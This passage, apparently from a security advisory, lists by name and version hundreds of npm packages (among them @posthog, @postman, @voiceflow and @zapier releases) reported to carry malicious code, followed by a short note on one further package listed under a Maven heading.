| @posthog/plugin-unduplicates                                | [0.0.8]                             |
| @posthog/postgres-plugin                                    | [0.0.8]                             |
| @posthog/react-rrweb-player                                 | [1.1.4]                             |
| @posthog/rrdom                                              | [0.0.31]                            |
| @posthog/rrweb                                              | [0.0.31]                            |
| @posthog/rrweb-player                                       | [0.0.31]                            |
| @posthog/rrweb-record                                       | [0.0.31]                            |
| @posthog/rrweb-replay                                       | [0.0.19]                            |
| @posthog/rrweb-snapshot                                     | [0.0.31]                            |
| @posthog/rrweb-utils                                        | [0.0.31]                            |
| @posthog/sendgrid-plugin                                    | [0.0.8]                             |
| @posthog/siphash                                            | [1.1.2]                             |
| @posthog/snowflake-export-plugin                            | [0.0.8]                             |
| @posthog/taxonomy-plugin                                    | [0.0.8]                             |
| @posthog/twilio-plugin                                      | [0.0.8]                             |
| @posthog/twitter-followers-plugin                           | [0.0.8]                             |
| @posthog/url-normalizer-plugin                              | [0.0.8]                             |
| @posthog/variance-plugin                                    | [0.0.8]                             |
| @posthog/web-dev-server                                     | [1.0.5]                             |
| @posthog/wizard                                             | [1.18.1]                            |
| @posthog/zendesk-plugin                                     | [0.0.8]                             |
| @postman/aether-icons                                       | [2.23.2],[2.23.3],[2.23.4]          |
| @postman/csv-parse                                          | [4.0.3],[4.0.4],[4.0.5]             |
| @postman/final-node-keytar                                  | [7.9.1],[7.9.2],[7.9.3]             |
| @postman/mcp-ui-client                                      | [5.5.1],[5.5.2],[5.5.3]             |
| @postman/node-keytar                                        | [7.9.4],[7.9.5],[7.9.6]             |
| @postman/pm-bin-linux-x64                                   | [1.24.3],[1.24.4],[1.24.5]          |
| @postman/pm-bin-macos-arm64                                 | [1.24.3],[1.24.4],[1.24.5]          |
| @postman/pm-bin-macos-x64                                   | [1.24.3],[1.24.4],[1.24.5]          |
| @postman/pm-bin-windows-x64                                 | [1.24.3],[1.24.4],[1.24.5]          |
| @postman/postman-collection-fork                            | [4.3.3],[4.3.4],[4.3.5]             |
| @postman/postman-mcp-cli                                    | [1.0.3],[1.0.4],[1.0.5]             |
| @postman/postman-mcp-server                                 | [2.4.10],[2.4.11],[2.4.12]          |
| @postman/pretty-ms                                          | [6.1.1],[6.1.2],[6.1.3]             |
| @postman/secret-scanner-wasm                                | [2.1.2],[2.1.3],[2.1.4]             |
| @postman/tunnel-agent                                       | [0.6.5],[0.6.6],[0.6.7]             |
| @postman/wdio-allure-reporter                               | [0.0.7],[0.0.8],[0.0.9]             |
| @postman/wdio-junit-reporter                                | [0.0.4],[0.0.5],[0.0.6]             |
| @pradhumngautam/common-app                                  | [1.0.2]                             |
| @productdevbook/animejs-vue                                 | [0.2.1]                             |
| @productdevbook/auth                                        | [0.2.2]                             |
| @productdevbook/chatwoot                                    | [2.0.1]                             |
| @productdevbook/motion                                      | [1.0.4]                             |
| @productdevbook/ts-i18n                                     | [1.4.2]                             |
| @pruthvi21/use-debounce                                     | [1.0.3]                             |
| @quick-start-soft/quick-document-translator                 | [1.4.2511142126]                    |
| @quick-start-soft/quick-git-clean-markdown                  | [1.4.2511142126]                    |
| @quick-start-soft/quick-markdown                            | [1.4.2511142126]                    |
| @quick-start-soft/quick-markdown-compose                    | [1.4.2506300029]                    |
| @quick-start-soft/quick-markdown-image                      | [1.4.2511142126]                    |
| @quick-start-soft/quick-markdown-print                      | [1.4.2511142126]                    |
| @quick-start-soft/quick-markdown-translator                 | [1.4.2509202331]                    |
| @quick-start-soft/quick-remove-image-background             | [1.4.2511142126]                    |
| @quick-start-soft/quick-task-refine                         | [1.4.2511142126]                    |
| @relyt/claude-context-core                                  | [0.1.1]                             |
| @relyt/claude-context-mcp                                   | [0.1.1]                             |
| @relyt/mcp-server-relytone                                  | [0.0.3]                             |
| @sameepsi/sor                                               | [1.0.3]                             |
| @sameepsi/sor2                                              | [2.0.2]                             |
| @seezo/sdr-mcp-server                                       | [0.0.5]                             |
| @seung-ju/next                                              | [0.0.2]                             |
| @seung-ju/openapi-generator                                 | [0.0.4]                             |
| @seung-ju/react-hooks                                       | [0.0.2]                             |
| @seung-ju/react-native-action-sheet                         | [0.2.1]                             |
| @silgi/better-auth                                          | [0.8.1]                             |
| @silgi/drizzle                                              | [0.8.4]                             |
| @silgi/ecosystem                                            | [0.7.6]                             |
| @silgi/graphql                                              | [0.7.15]                            |
| @silgi/module-builder                                       | [0.8.8]                             |
| @silgi/openapi                                              | [0.7.4]                             |
| @silgi/permission                                           | [0.6.8]                             |
| @silgi/ratelimit                                            | [0.2.1]                             |
| @silgi/scalar                                               | [0.6.2]                             |
| @silgi/yoga                                                 | [0.7.1]                             |
| @sme-ui/aoma-vevasound-metadata-lib                         | [0.1.3]                             |
| @strapbuild/react-native-date-time-picker                   | [2.0.4]                             |
| @strapbuild/react-native-perspective-image-cropper          | [0.4.15]                            |
| @strapbuild/react-native-perspective-image-cropper-2        | [0.4.7]                             |
| @strapbuild/react-native-perspective-image-cropper-poojan31 | [0.4.6]                             |
| @suraj_h/medium-common                                      | [1.0.5]                             |
| @thedelta/eslint-config                                     | [1.0.2]                             |
| @tiaanduplessis/json                                        | [2.0.2],[2.0.3]                     |
| @tiaanduplessis/react-progressbar                           | [1.0.1],[1.0.2]                     |
| @trackstar/angular-trackstar-link                           | [1.0.2]                             |
| @trackstar/react-trackstar-link                             | [2.0.21]                            |
| @trackstar/react-trackstar-link-upgrade                     | [1.1.10]                            |
| @trackstar/test-angular-package                             | [0.0.9]                             |
| @trackstar/test-package                                     | [1.1.5]                             |
| @trefox/sleekshop-js                                        | [0.1.6]                             |
| @trigo/atrix                                                | [7.0.1]                             |
| @trigo/atrix-acl                                            | [4.0.2]                             |
| @trigo/atrix-elasticsearch                                  | [2.0.1]                             |
| @trigo/atrix-mongoose                                       | [1.0.2]                             |
| @trigo/atrix-orientdb                                       | [1.0.2]                             |
| @trigo/atrix-postgres                                       | [1.0.3]                             |
| @trigo/atrix-pubsub                                         | [4.0.3]                             |
| @trigo/atrix-redis                                          | [1.0.2]                             |
| @trigo/atrix-soap                                           | [1.0.2]                             |
| @trigo/atrix-swagger                                        | [3.0.1]                             |
| @trigo/bool-expressions                                     | [4.1.3]                             |
| @trigo/eslint-config-trigo                                  | [3.3.1]                             |
| @trigo/fsm                                                  | [3.4.2]                             |
| @trigo/hapi-auth-signedlink                                 | [1.3.1]                             |
| @trigo/jsdt                                                 | [0.2.1]                             |
| @trigo/keycloak-api                                         | [1.3.1]                             |
| @trigo/node-soap                                            | [0.5.4]                             |
| @trigo/pathfinder-ui-css                                    | [0.1.1]                             |
| @trigo/trigo-hapijs                                         | [5.0.1]                             |
| @trpc-rate-limiter/cloudflare                               | [0.1.4]                             |
| @trpc-rate-limiter/hono                                     | [0.1.4]                             |
| @varsityvibe/api-client                                     | [1.3.36],[1.3.37]                   |
| @varsityvibe/utils                                          | [5.0.6]                             |
| @varsityvibe/validation-schemas                             | [0.6.7],[0.6.8]                     |
| @viapip/eslint-config                                       | [0.2.4]                             |
| @vishadtyagi/full-year-calendar                             | [0.1.11]                            |
| @voiceflow/alexa-types                                      | [2.15.60],[2.15.61]                 |
| @voiceflow/anthropic                                        | [0.4.4],[0.4.5]                     |
| @voiceflow/api-sdk                                          | [3.28.58],[3.28.59]                 |
| @voiceflow/backend-utils                                    | [5.0.1],[5.0.2]                     |
| @voiceflow/base-types                                       | [2.136.2],[2.136.3]                 |
| @voiceflow/body-parser                                      | [1.21.2],[1.21.3]                   |
| @voiceflow/chat-types                                       | [2.14.58],[2.14.59]                 |
| @voiceflow/circleci-config-sdk-orb-import                   | [0.2.1],[0.2.2]                     |
| @voiceflow/commitlint-config                                | [2.6.1],[2.6.2]                     |
| @voiceflow/common                                           | [8.9.1],[8.9.2]                     |
| @voiceflow/default-prompt-wrappers                          | [1.7.3],[1.7.4]                     |
| @voiceflow/dependency-cruiser-config                        | [1.8.11],[1.8.12]                   |
| @voiceflow/dtos-interact                                    | [1.40.1],[1.40.2]                   |
| @voiceflow/encryption                                       | [0.3.2],[0.3.3]                     |
| @voiceflow/eslint-config                                    | [7.16.4],[7.16.5]                   |
| @voiceflow/eslint-plugin                                    | [1.6.1],[1.6.2]                     |
| @voiceflow/exception                                        | [1.10.1],[1.10.2]                   |
| @voiceflow/fetch                                            | [1.11.1],[1.11.2]                   |
| @voiceflow/general-types                                    | [3.2.22],[3.2.23]                   |
| @voiceflow/git-branch-check                                 | [1.4.3],[1.4.4]                     |
| @voiceflow/google-dfes-types                                | [2.17.12],[2.17.13]                 |
| @voiceflow/google-types                                     | [2.21.12],[2.21.13]                 |
| @voiceflow/husky-config                                     | [1.3.1],[1.3.2]                     |
| @voiceflow/logger                                           | [2.4.2],[2.4.3]                     |
| @voiceflow/metrics                                          | [1.5.1],[1.5.2]                     |
| @voiceflow/natural-language-commander                       | [0.5.2],[0.5.3]                     |
| @voiceflow/nestjs-common                                    | [2.75.2],[2.75.3]                   |
| @voiceflow/nestjs-mongodb                                   | [1.3.1],[1.3.2]                     |
| @voiceflow/nestjs-rate-limit                                | [1.3.2],[1.3.3]                     |
| @voiceflow/nestjs-redis                                     | [1.3.1],[1.3.2]                     |
| @voiceflow/nestjs-timeout                                   | [1.3.1],[1.3.2]                     |
| @voiceflow/npm-package-json-lint-config                     | [1.1.1],[1.1.2]                     |
| @voiceflow/openai                                           | [3.2.2],[3.2.3]                     |
| @voiceflow/pino                                             | [6.11.3],[6.11.4]                   |
| @voiceflow/pino-pretty                                      | [4.4.1],[4.4.2]                     |
| @voiceflow/prettier-config                                  | [1.10.1],[1.10.2]                   |
| @voiceflow/react-chat                                       | [1.65.3],[1.65.4]                   |
| @voiceflow/runtime                                          | [1.29.1],[1.29.2]                   |
| @voiceflow/runtime-client-js                                | [1.17.2],[1.17.3]                   |
| @voiceflow/sdk-runtime                                      | [1.43.1],[1.43.2]                   |
| @voiceflow/secrets-provider                                 | [1.9.2],[1.9.3]                     |
| @voiceflow/semantic-release-config                          | [1.4.1],[1.4.2]                     |
| @voiceflow/serverless-plugin-typescript                     | [2.1.7],[2.1.8]                     |
| @voiceflow/slate-serializer                                 | [1.7.3],[1.7.4]                     |
| @voiceflow/stitches-react                                   | [2.3.2],[2.3.3]                     |
| @voiceflow/storybook-config                                 | [1.2.2],[1.2.3]                     |
| @voiceflow/stylelint-config                                 | [1.1.1],[1.1.2]                     |
| @voiceflow/test-common                                      | [2.1.1],[2.1.2]                     |
| @voiceflow/tsconfig                                         | [1.12.1],[1.12.2]                   |
| @voiceflow/tsconfig-paths                                   | [1.1.4],[1.1.5]                     |
| @voiceflow/utils-designer                                   | [1.74.19],[1.74.20]                 |
| @voiceflow/verror                                           | [1.1.4],[1.1.5]                     |
| @voiceflow/vite-config                                      | [2.6.2],[2.6.3]                     |
| @voiceflow/vitest-config                                    | [1.10.2],[1.10.3]                   |
| @voiceflow/voice-types                                      | [2.10.58],[2.10.59]                 |
| @voiceflow/voiceflow-types                                  | [3.32.45],[3.32.46]                 |
| @voiceflow/widget                                           | [1.7.18],[1.7.19]                   |
| @vucod/email                                                | [0.0.3]                             |
| @zapier/ai-actions                                          | [0.1.18],[0.1.19],[0.1.20]          |
| @zapier/ai-actions-react                                    | [0.1.12],[0.1.13],[0.1.14]          |
| @zapier/babel-preset-zapier                                 | [6.4.1],[6.4.2],[6.4.3]             |
| @zapier/browserslist-config-zapier                          | [1.0.3],[1.0.4],[1.0.5]             |
| @zapier/eslint-plugin-zapier                                | [11.0.3],[11.0.4],[11.0.5]          |
| @zapier/mcp-integration                                     | [3.0.1],[3.0.2],[3.0.3]             |
| @zapier/secret-scrubber                                     | [1.1.3],[1.1.4],[1.1.5]             |
| @zapier/spectral-api-ruleset                                | [1.9.1],[1.9.2],[1.9.3]             |
| @zapier/stubtree                                            | [0.1.2],[0.1.3],[0.1.4]             |
| @zapier/zapier-sdk                                          | [0.15.5],[0.15.6],[0.15.7]          |
| ai-crowl-shield                                             | [1.0.7]                             |
| arc-cli-fc                                                  | [1.0.1]                             |
| asciitranslator                                             | [1.0.3]                             |
| asyncapi-preview                                            | [1.0.1],[1.0.2]                     |
| atrix                                                       | [1.0.1]                             |
| atrix-mongoose                                              | [1.0.1]                             |
| automation_model                                            | [1.0.491]                           |
| avvvatars-vue                                               | [1.1.2]                             |
| axios-builder                                               | [1.2.1]                             |
| axios-cancelable                                            | [1.0.1],[1.0.2]                     |
| axios-timed                                                 | [1.0.1],[1.0.2]                     |
| barebones-css                                               | [1.1.3],[1.1.4]                     |
| benmostyn-frame-print                                       | [1.0.1]                             |
| best_gpio_controller                                        | [1.0.10]                            |
| better-auth-nuxt                                            | [0.0.10]                            |
| bidirectional-adapter                                       | [1.2.2],[1.2.3],[1.2.4],[1.2.5]     |
| blinqio-executions-cli                                      | [1.0.41]                            |
| blob-to-base64                                              | [1.0.3]                             |
| bool-expressions                                            | [0.1.2]                             |
| buffered-interpolation-babylon6                             | [0.2.8]                             |
| bun-plugin-httpfile                                         | [0.1.1]                             |
| bytecode-checker-cli                                        | [1.0.10],[1.0.11],[1.0.8],[1.0.9]   |
| bytes-to-x                                                  | [1.0.1]                             |
| calc-loan-interest                                          | [1.0.4]                             |
| capacitor-plugin-apptrackingios                             | [0.0.21]                            |
| capacitor-plugin-purchase                                   | [0.1.1]                             |
| capacitor-plugin-scgssigninwithgoogle                       | [0.0.5]                             |
| capacitor-purchase-history                                  | [0.0.10]                            |
| capacitor-voice-recorder-wav                                | [6.0.3]                             |
| ceviz                                                       | [0.0.5]                             |
| chrome-extension-downloads                                  | [0.0.3],[0.0.4]                     |
| claude-token-updater                                        | [1.0.3]                             |
| coinmarketcap-api                                           | [3.1.2],[3.1.3]                     |
| colors-regex                                                | [2.0.1]                             |
| command-irail                                               | [0.5.4]                             |
| compare-obj                                                 | [1.1.1],[1.1.2]                     |
| composite-reducer                                           | [1.0.2],[1.0.3],[1.0.4],[1.0.5]     |
| count-it-down                                               | [1.0.1],[1.0.2]                     |
| cpu-instructions                                            | [0.0.14]                            |
| create-director-app                                         | [0.1.1]                             |
| create-glee-app                                             | [0.2.2],[0.2.3]                     |
| create-hardhat3-app                                         | [1.1.1],[1.1.2],[1.1.3],[1.1.4]     |
| create-mcp-use-app                                          | [0.5.3],[0.5.4]                     |
| create-silgi                                                | [0.3.1]                             |
| crypto-addr-codec                                           | [0.1.9]                             |
| css-dedoupe                                                 | [0.1.2]                             |
| csv-tool-cli                                                | [1.2.1]                             |
| dashboard-empty-state                                       | [1.0.3]                             |
| designstudiouiux                                            | [1.0.1]                             |
| devstart-cli                                                | [1.0.6]                             |
| dialogflow-es                                               | [1.1.1],[1.1.2],[1.1.3],[1.1.4]     |
| discord-bot-server                                          | [0.1.2]                             |
| docusaurus-plugin-vanilla-extract                           | [1.0.3]                             |
| dont-go                                                     | [1.1.2]                             |
| dotnet-template                                             | [0.0.3],[0.0.4]                     |
| drop-events-on-property-plugin                              | [0.0.2]                             |
| easypanel-sdk                                               | [0.3.2]                             |
| email-deliverability-tester                                 | [1.1.1]                             |
| enforce-branch-name                                         | [1.1.3]                             |
| esbuild-plugin-brotli                                       | [0.2.1]                             |
| esbuild-plugin-eta                                          | [0.1.1]                             |
| esbuild-plugin-httpfile                                     | [0.4.1]                             |
| eslint-config-nitpicky                                      | [4.0.1]                             |
| eslint-config-trigo                                         | [22.0.2]                            |
| eslint-config-zeallat-base                                  | [1.0.4]                             |
| ethereum-ens                                                | [0.8.1]                             |
| evm-checkcode-cli                                           | [1.0.12],[1.0.13],[1.0.14],[1.0.15] |
| exact-ticker                                                | [0.3.5]                             |
| expo-audio-session                                          | [0.2.1]                             |
| expo-router-on-rails                                        | [0.0.4]                             |
| express-starter-template                                    | [1.0.10]                            |
| expressos                                                   | [1.1.3]                             |
| fat-fingered                                                | [1.0.1],[1.0.2]                     |
| feature-flip                                                | [1.0.1],[1.0.2]                     |
| firestore-search-engine                                     | [1.2.3]                             |
| fittxt                                                      | [1.0.2],[1.0.3]                     |
| flapstacks                                                  | [1.0.1],[1.0.2]                     |
| flatten-unflatten                                           | [1.0.1],[1.0.2]                     |
| formik-error-focus                                          | [2.0.1]                             |
| formik-store                                                | [1.0.1]                             |
| frontity-starter-theme                                      | [1.0.1]                             |
| fuzzy-finder                                                | [1.0.5],[1.0.6]                     |
| gate-evm-check-code2                                        | [2.0.3],[2.0.4],[2.0.5],[2.0.6]     |
| gate-evm-tools-test                                         | [1.0.5],[1.0.6],[1.0.7],[1.0.8]     |
| gatsby-plugin-antd                                          | [2.2.1]                             |
| gatsby-plugin-cname                                         | [1.0.1],[1.0.2]                     |
| generator-meteor-stock                                      | [0.1.6]                             |
| generator-ng-itobuz                                         | [0.0.15]                            |
| get-them-args                                               | [1.3.3]                             |
| github-action-for-generator                                 | [2.1.27],[2.1.28]                   |
| gitsafe                                                     | [1.0.5]                             |
| go-template                                                 | [0.1.8],[0.1.9]                     |
| gulp-inject-envs                                            | [1.2.1],[1.2.2]                     |
| haufe-axera-api-client                                      | [0.0.1],[0.0.2]                     |
| hope-mapboxdraw                                             | [0.1.1]                             |
| hopedraw                                                    | [1.0.3]                             |
| hover-design-prototype                                      | [0.0.5]                             |
| httpness                                                    | [1.0.2],[1.0.3]                     |
| hyper-fullfacing                                            | [1.0.3]                             |
| hyperterm-hipster                                           | [1.0.7]                             |
| ids-css                                                     | [1.5.1]                             |
| ids-enterprise-mcp-server                                   | [0.0.2]                             |
| ids-enterprise-ng                                           | [20.1.6]                            |
| ids-enterprise-typings                                      | [20.1.6]                            |
| image-to-uri                                                | [1.0.1],[1.0.2]                     |
| insomnia-plugin-random-pick                                 | [1.0.4]                             |
| invo                                                        | [0.2.2]                             |
| iron-shield-miniapp                                         | [0.0.2]                             |
| ito-button                                                  | [8.0.3]                             |
| itobuz-angular                                              | [0.0.1]                             |
| itobuz-angular-auth                                         | [8.0.11]                            |
| itobuz-angular-button                                       | [8.0.11]                            |
| jacob-zuma                                                  | [1.0.1],[1.0.2]                     |
| jaetut-varit-test                                           | [1.0.2]                             |
| jan-browser                                                 | [0.13.1]                            |
| jquery-bindings                                             | [1.1.2],[1.1.3]                     |
| jsonsurge                                                   | [1.0.7]                             |
| just-toasty                                                 | [1.7.1]                             |
| kill-port                                                   | [2.0.2],[2.0.3]                     |
| kinetix-default-token-list                                  | [1.0.5]                             |
| kns-error-code                                              | [1.0.8]                             |
| korea-administrative-area-geo-json-util                     | [1.0.7]                             |
| kwami                                                       | [1.5.10],[1.5.9]                    |
| lang-codes                                                  | [1.0.1],[1.0.2]                     |
| license-o-matic                                             | [1.2.1],[1.2.2]                     |
| lint-staged-imagemin                                        | [1.3.1],[1.3.2]                     |
| lite-serper-mcp-server                                      | [0.2.2]                             |
| lui-vue-test                                                | [0.70.9]                            |
| luno-api                                                    | [1.2.3]                             |
| m25-transaction-utils                                       | [1.1.16]                            |
| manual-billing-system-miniapp-api                           | [1.3.1]                             |
| mcp-use                                                     | [1.4.2],[1.4.3]                     |
| medusa-plugin-announcement                                  | [0.0.3]                             |
| medusa-plugin-logs                                          | [0.0.17]                            |
| medusa-plugin-momo                                          | [0.0.68]                            |
| medusa-plugin-product-reviews-kvy                           | [0.0.4]                             |
| medusa-plugin-zalopay                                       | [0.0.40]                            |
| mod10-check-digit                                           | [1.0.1]                             |
| mon-package-react-typescript                                | [1.0.1]                             |
| my-saeed-lib                                                | [0.1.1]                             |
| n8n-nodes-tmdb                                              | [0.5.1]                             |
| n8n-nodes-vercel-ai-sdk                                     | [0.1.7]                             |
| n8n-nodes-viral-app                                         | [0.2.5]                             |
| nanoreset                                                   | [7.0.1],[7.0.2]                     |
| next-circular-dependency                                    | [1.0.2],[1.0.3]                     |
| next-simple-google-analytics                                | [1.1.1],[1.1.2]                     |
| next-styled-nprogress                                       | [1.0.4],[1.0.5]                     |
| ngx-useful-swiper-prosenjit                                 | [9.0.2]                             |
| ngx-wooapi                                                  | [12.0.1]                            |
| nitro-graphql                                               | [1.5.12]                            |
| nitro-kutu                                                  | [0.1.1]                             |
| nitrodeploy                                                 | [1.0.8]                             |
| nitroping                                                   | [0.1.1]                             |
| normal-store                                                | [1.3.1],[1.3.2],[1.3.3],[1.3.4]     |
| nuxt-keycloak                                               | [0.2.2]                             |
| obj-to-css                                                  | [1.0.2],[1.0.3]                     |
| okta-react-router-6                                         | [5.0.1]                             |
| open2internet                                               | [0.1.1]                             |
| orbit-boxicons                                              | [2.1.3]                             |
| orbit-nebula-draw-tools                                     | [1.0.10]                            |
| orbit-nebula-editor                                         | [1.0.2]                             |
| orbit-soap                                                  | [0.43.13]                           |
| orchestrix                                                  | [12.1.2]                            |
| package-tester                                              | [1.0.1]                             |
| parcel-plugin-asset-copier                                  | [1.1.2],[1.1.3]                     |
| pdf-annotation                                              | [0.0.2]                             |
| pergel                                                      | [0.13.2]                            |
| pergeltest                                                  | [0.0.25]                            |
| piclite                                                     | [1.0.1]                             |
| pico-uid                                                    | [1.0.3],[1.0.4]                     |
| pkg-readme                                                  | [1.1.1]                             |
| poper-react-sdk                                             | [0.1.2]                             |
| posthog-docusaurus                                          | [2.0.6]                             |
| posthog-js                                                  | [1.297.3]                           |
| posthog-node                                                | [4.18.1],[5.11.3],[5.13.3]          |
| posthog-plugin-hello-world                                  | [1.0.1]                             |
| posthog-react-native                                        | [4.11.1],[4.12.5]                   |
| posthog-react-native-session-replay                         | [1.2.2]                             |
| prime-one-table                                             | [0.0.19]                            |
| prompt-eng                                                  | [1.0.50]                            |
| prompt-eng-server                                           | [1.0.18]                            |
| puny-req                                                    | [1.0.3]                             |
| quickswap-ads-list                                          | [1.0.33]                            |
| quickswap-default-staking-list                              | [1.0.11]                            |
| quickswap-default-staking-list-address                      | [1.0.55]                            |
| quickswap-default-token-list                                | [1.5.16]                            |
| quickswap-router-sdk                                        | [1.0.1]                             |
| quickswap-sdk                                               | [3.0.44]                            |
| quickswap-smart-order-router                                | [1.0.1]                             |
| quickswap-token-lists                                       | [1.0.3]                             |
| quickswap-v2-sdk                                            | [2.0.1]                             |
| ra-auth-firebase                                            | [1.0.3]                             |
| ra-data-firebase                                            | [1.0.7],[1.0.8]                     |
| react-component-taggers                                     | [0.1.9]                             |
| react-data-to-export                                        | [1.0.1]                             |
| react-element-prompt-inspector                              | [0.1.18]                            |
| react-favic                                                 | [1.0.2]                             |
| react-hook-form-persist                                     | [3.0.1],[3.0.2]                     |
| react-jam-icons                                             | [1.0.1],[1.0.2]                     |
| react-keycloak-context                                      | [1.0.8],[1.0.9]                     |
| react-library-setup                                         | [0.0.6]                             |
| react-linear-loader                                         | [1.0.2]                             |
| react-micromodal.js                                         | [1.0.1],[1.0.2]                     |
| react-native-datepicker-modal                               | [1.3.1],[1.3.2]                     |
| react-native-email                                          | [2.1.1],[2.1.2]                     |
| react-native-fetch                                          | [2.0.1],[2.0.2]                     |
| react-native-get-pixel-dimensions                           | [1.0.1],[1.0.2]                     |
| react-native-google-maps-directions                         | [2.1.2]                             |
| react-native-jam-icons                                      | [1.0.1],[1.0.2]                     |
| react-native-log-level                                      | [1.2.1],[1.2.2]                     |
| react-native-modest-checkbox                                | [3.3.1]                             |
| react-native-modest-storage                                 | [2.1.1]                             |
| react-native-phone-call                                     | [1.2.1],[1.2.2]                     |
| react-native-retriable-fetch                                | [2.0.1],[2.0.2]                     |
| react-native-use-modal                                      | [1.0.3]                             |
| react-native-view-finder                                    | [1.2.1],[1.2.2]                     |
| react-native-websocket                                      | [1.0.3],[1.0.4]                     |
| react-native-worklet-functions                              | [3.3.3]                             |
| react-packery-component                                     | [1.0.3]                             |
| react-qr-image                                              | [1.1.1]                             |
| react-scrambled-text                                        | [1.0.4]                             |
| rediff                                                      | [1.0.5]                             |
| rediff-viewer                                               | [0.0.7]                             |
| redux-forge                                                 | [2.5.3]                             |
| redux-router-kit                                            | [1.2.2],[1.2.3],[1.2.4]             |
| revenuecat                                                  | [1.0.1]                             |
| rollup-plugin-httpfile                                      | [0.2.1]                             |
| sa-company-registration-number-regex                        | [1.0.1],[1.0.2]                     |
| sa-id-gen                                                   | [1.0.4],[1.0.5]                     |
| samesame                                                    | [1.0.3]                             |
| scgs-capacitor-subscribe                                    | [1.0.11]                            |
| scgsffcreator                                               | [1.0.5]                             |
| schob                                                       | [1.0.3]                             |
| selenium-session                                            | [1.0.5]                             |
| selenium-session-client                                     | [1.0.4]                             |
| set-nested-prop                                             | [2.0.1],[2.0.2]                     |
| shelf-jwt-sessions                                          | [0.1.2]                             |
| shell-exec                                                  | [1.1.3],[1.1.4]                     |
| shinhan-limit-scrap                                         | [1.0.3]                             |
| silgi                                                       | [0.43.30]                           |
| simplejsonform                                              | [1.0.1]                             |
| skills-use                                                  | [0.1.1],[0.1.2]                     |
| solomon-api-stories                                         | [1.0.2]                             |
| solomon-v3-stories                                          | [1.15.6]                            |
| solomon-v3-ui-wrapper                                       | [1.6.1]                             |
| soneium-acs                                                 | [1.0.1]                             |
| sort-by-distance                                            | [2.0.1]                             |
| south-african-id-info                                       | [1.0.2]                             |
| stat-fns                                                    | [1.0.1]                             |
| stoor                                                       | [2.3.2]                             |
| sufetch                                                     | [0.4.1]                             |
| super-commit                                                | [1.0.1]                             |
| svelte-autocomplete-select                                  | [1.1.1]                             |
| svelte-toasty                                               | [1.1.2],[1.1.3]                     |
| tanstack-shadcn-table                                       | [1.1.5]                             |
| tavily-module                                               | [1.0.1]                             |
| tcsp                                                        | [2.0.2]                             |
| tcsp-draw-test                                              | [1.0.5]                             |
| tcsp-test-vd                                                | [2.4.4]                             |
| template-lib                                                | [1.1.3],[1.1.4]                     |
| template-micro-service                                      | [1.0.2],[1.0.3]                     |
| tenacious-fetch                                             | [2.3.2],[2.3.3]                     |
| test-foundry-app                                            | [1.0.1],[1.0.2],[1.0.3],[1.0.4]     |
| test-hardhat-app                                            | [1.0.1],[1.0.2],[1.0.3],[1.0.4]     |
| test23112222-api                                            | [1.0.1]                             |
| tiaan                                                       | [1.0.2]                             |
| tiptap-shadcn-vue                                           | [0.2.1]                             |
| token.js-fork                                               | [0.7.32]                            |
| toonfetch                                                   | [0.3.2]                             |
| trigo-react-app                                             | [4.1.2]                             |
| ts-relay-cursor-paging                                      | [2.1.1]                             |
| typeface-antonio-complete                                   | [1.0.5]                             |
| typefence                                                   | [1.2.2],[1.2.3]                     |
| typeorm-orbit                                               | [0.2.27]                            |
| unadapter                                                   | [0.1.3]                             |
| undefsafe-typed                                             | [1.0.3],[1.0.4]                     |
| unemail                                                     | [0.3.1]                             |
| uniswap-router-sdk                                          | [1.6.2]                             |
| uniswap-smart-order-router                                  | [3.16.26]                           |
| uniswap-test-sdk-core                                       | [4.0.8]                             |
| unsearch                                                    | [0.0.3]                             |
| uplandui                                                    | [0.5.4]                             |
| upload-to-play-store                                        | [1.0.1],[1.0.2]                     |
| url-encode-decode                                           | [1.0.1],[1.0.2]                     |
| use-unsaved-changes                                         | [1.0.9]                             |
| v-plausible                                                 | [1.2.1]                             |
| valid-south-african-id                                      | [1.0.3]                             |
| valuedex-sdk                                                | [3.0.5]                             |
| vf-oss-template                                             | [1.0.1],[1.0.2],[1.0.3],[1.0.4]     |
| victoria-wallet-constants                                   | [0.1.1],[0.1.2]                     |
| victoria-wallet-core                                        | [0.1.1],[0.1.2]                     |
| victoria-wallet-type                                        | [0.1.1],[0.1.2]                     |
| victoria-wallet-utils                                       | [0.1.1],[0.1.2]                     |
| victoria-wallet-validator                                   | [0.1.1],[0.1.2]                     |
| victoriaxoaquyet-wallet-core                                | [0.2.1],[0.2.2]                     |
| vite-plugin-httpfile                                        | [0.2.1]                             |
| vue-browserupdate-nuxt                                      | [1.0.5]                             |
| wallet-evm                                                  | [0.3.1],[0.3.2]                     |
| wallet-type                                                 | [0.1.1],[0.1.2]                     |
| web-scraper-mcp                                             | [1.1.4]                             |
| web-types-htmx                                              | [0.1.1]                             |
| web-types-lit                                               | [0.1.1]                             |
| webpack-loader-httpfile                                     | [0.2.1]                             |
| wellness-expert-ng-gallery                                  | [5.1.1]                             |
| wenk                                                        | [1.0.10],[1.0.9]                    |
| zapier-async-storage                                        | [1.0.1],[1.0.2],[1.0.3]             |
| zapier-platform-cli                                         | [18.0.2],[18.0.3],[18.0.4]          |
| zapier-platform-core                                        | [18.0.2],[18.0.3],[18.0.4]          |
| zapier-platform-legacy-scripting-runner                     | [4.0.2],[4.0.3],[4.0.4]             |
| zapier-platform-schema                                      | [18.0.2],[18.0.3],[18.0.4]          |
| zapier-scripts                                              | [7.8.3],[7.8.4]                     |
| zuper-cli                                                   | [1.0.1]                             |
| zuper-sdk                                                   | [1.0.57]                            |
| zuper-stream                                                | [2.0.9]                             |
| eslint-config-kinvey-flex-service                           | [0.10.1]                            |
| kinvey-flex-scripts                                         | [0.50.1]                            |
| kinvey-cli-wrapper                                          | [0.30.1]                            |
| better-queue-nedb                                           | [0.10.5]                            |
| create-kinvey-flex-service                                  | [0.20.1]                            |
| electron-volt                                               | [0.0.2]                             |
| babel-preset-kinvey-flex-service                            | [0.10.1]                            |
| @mizzle-dev/orm                                             | [0.0.2]                             |
| @micado-digital/stadtmarketing-kufstein-external            | [1.90.1]                            |

In addition to the packages mentioned above, malicious code has been discovered in a Maven package.

| package_name | versions |
|--------------|----------|
| posthog-node | v4.18.1  |
